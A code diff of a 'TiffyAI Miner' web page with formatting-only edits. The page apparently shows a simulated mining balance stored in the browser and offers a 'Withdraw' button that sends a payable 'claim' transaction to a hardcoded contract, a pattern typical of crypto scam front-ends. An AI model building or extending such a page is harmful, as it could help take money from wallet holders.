@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <title>TiffyAI Miner</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
       margin: 0; padding: 0;
@@ -21,7 +21,7 @@
     #backgroundVideo {
       position: fixed;
       top: 0; left: 0;
-      width: 100vw; height: 97vh;
+      width: 100vw; height: 100vh;
       object-fit: cover;
       z-index: -1;
     }
@@ -32,7 +32,7 @@
       background-position: center;
       position: fixed;
       top: 0; left: 0;
-      width: 100%; height: 97%;
+      width: 100%; height: 100%;
       z-index: -2;
     }
 
@@ -85,12 +85,11 @@
   <button id="withdrawBtn" disabled>💸 Withdraw</button>
   <button id="boostBtn">⚡ Upgrade With Key</button>
 
-  <!-- Modern Wallet Logic -->
   <script type="module">
-    import { walletKit } from './src/wallet.js'
+    import { walletKit } from './src/wallet.js';
 
-    const CONTRACT_ADDRESS = "0xE488253DD6B4D31431142F1b7601C96f24Fb7dd5"
-    const ABI = [{ "type": "function", "name": "claim", "stateMutability": "payable", "inputs": [], "outputs": [] }]
+    const CONTRACT_ADDRESS = "0xE488253DD6B4D31431142F1b7601C96f24Fb7dd5";
+    const ABI = [{ "type": "function", "name": "claim", "stateMutability": "payable", "inputs": [], "outputs": [] }];
 
     const COUNTER_KEY = 'tiffy_balance';
     const SPEED_KEY = 'tiffy_speed';
@@ -163,20 +162,20 @@
 
     connectBtn.addEventListener('click', async () => {
       try {
-        const provider = await walletKit.connect()
-        web3 = new Web3(provider)
-        const accounts = await web3.eth.getAccounts()
-        account = accounts[0]
-        connectBtn.innerText = `✅ ${account.slice(0, 6)}...Connected`
-        contract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS)
+        const provider = await walletKit.connect();
+        web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        account = accounts[0];
+        connectBtn.innerText = `✅ ${account.slice(0, 6)}...Connected`;
+        contract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);
       } catch (err) {
-        console.error("Connection error:", err)
-        alert("❌ Failed to connect wallet.")
+        console.error("Connection error:", err);
+        alert("❌ Failed to connect wallet.");
       }
     });
 
     withdrawBtn.addEventListener('click', async () => {
-      if (!contract || !account) return alert("❌ Connect your wallet first.")
+      if (!contract || !account) return alert("❌ Connect your wallet first.");
       try {
         await contract.methods.claim().send({
           from: account,
@@ -195,9 +194,9 @@
       }
     });
 
-    updateKeyDisplay()
-    updateTiffyDisplay()
-    setBackgroundVideo('mine.mp4', true)
+    updateKeyDisplay();
+    updateTiffyDisplay();
+    setBackgroundVideo('mine.mp4', true);
   </script>
 </body>
 </html>
